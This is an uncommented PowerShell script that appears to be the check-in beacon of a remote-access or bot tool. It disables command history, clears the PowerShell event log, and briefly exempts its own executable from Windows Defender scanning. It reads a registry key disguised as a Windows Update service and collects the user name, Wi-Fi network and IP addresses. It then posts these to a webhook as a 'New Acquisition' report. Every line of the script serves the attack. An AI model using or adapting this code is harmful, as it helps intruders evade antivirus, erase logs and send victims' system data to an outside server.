$webhookUrl = "from acquisitons sections, PingBot"
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$scriptPath = $MyInvocation.MyCommand.Path
$exePath = "$scriptPath.exe"
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $exePath) {
    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
}
$regPath = "HKLM:\Software\WindowsUpdateService"
$regItem = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
$code = if ($regItem) { $regItem.Code } else { "Unknown" }
$data = if ($regItem) { $regItem.Data } else { "Unknown" }
$username = ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
function Get-WiFiNetworkName {
    $profilewlan = Get-NetConnectionProfile -ErrorAction SilentlyContinue
    if ($profilewlan -and $profilewlan.InterfaceAlias -like "*W*") {
        return $profilewlan.Name
    } else {
        return "Not connected to a Wi-Fi network."
    }
}
$networkStatus = Get-WiFiNetworkName
$networkInterfaces = Get-NetIPAddress -AddressFamily IPv4 | ForEach-Object {
    $interface = $_.InterfaceAlias
    $ip = $_.IPAddress
    "$interface,{$ip}"
}
$combinedString = $networkInterfaces -join ','
$combineddata = "New Acquisition **$code**, Current Status **$data**, Logged on user **$username**, Current Network **$networkStatus**,
**IPs** *$combinedString*"
$jsonPayload = @{
    content = $combineddata
} | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
Remove-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue